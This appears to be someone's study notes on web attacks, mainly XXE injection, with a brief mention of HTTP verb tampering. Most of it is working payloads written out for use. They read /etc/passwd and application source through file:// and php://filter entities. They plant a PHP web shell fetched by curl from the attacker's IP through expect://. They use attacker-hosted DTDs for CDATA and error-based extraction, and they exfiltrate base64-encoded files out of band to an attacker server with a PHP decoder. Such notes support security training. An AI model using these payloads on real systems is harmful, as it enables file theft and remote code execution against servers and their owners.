# Web attacks: on of my favorites
## HTTP tampering 

Exploiting HTTP Verb Tampering vulnerabilities is usually a relatively straightforward process. We just need to try alternate HTTP methods to see how they are handled by the web server and the web application

## XXE

Creating a doctype for example :

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
Note: In our example, the XML input in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the DOCTYPE was already declared in the XML request, we would just add the ENTITY element to it.

and we add his, below the xml version and then we reference if with `&`

We can use it for reading a file 

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

we can look for ssh keys and so on ! 

or get the source code with php filter:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

also it can be done for an RCE as follow 

    echo '<?php system($_REQUEST["cmd"]);?>' > shell.php

and then 
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

Note: The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.

## Advanced extraction with CDATA

in XML to extract data that will break XML content we use ` <![CDATA[ FILE_CONTENT ]]>`

One easy way to tackle this issue would be to define a begin internal entity with `<![CDATA[, an end internal entity with ]]>`, and then place our external entity file in between, and it should be considered as a CDATA element, as follows:


```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
After that, if we reference the &joined; entity, it should contain our escaped data. However, this will not work, since XML prevents joining internal and external entities, so we will have to find a better way to do so.
to bypass this we'll use this method on the Attack machine

    echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
    python3 -m http.server 8000

Then on the victim we reference the joined to our http server:

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://10.10.16.27:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

PS: Not all the files work with this injection
## Error based XXE

Here we use a non-existent entity and try to see if we have an error.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
<name>a</name>
<tel></tel>
<email>&nonExistingEntity;</email>
<message>c</message>
</root>
```
we write in out host this 

    <!ENTITY % file SYSTEM "file:///etc/hosts">
    <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

and then we launch our http server and add this to the vitime payload

```xml
    <!DOCTYPE email [ 
    <!ENTITY % remote SYSTEM "http://10.10.16.27:8000/xxe.dtd">
    %remote;
    %error;
    ]>
```

## Out-of-band Data Exfiltration

This method, we will make the server convert the file to base64 and send it to us directly with those two tags :

so we write an xxe.dtd as follow 
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
we can write this php file to directly decode tha base64 received and run http server with php

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
and then

  ```
  vi index.php # here we write the above PHP code
  php -S 0.0.0.0:8000
  ```
  
finally the injection payload as follow:


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

to finish take a look to an automated tool for xxe:

  git clone https://github.com/enjoiz/XXEinjector.git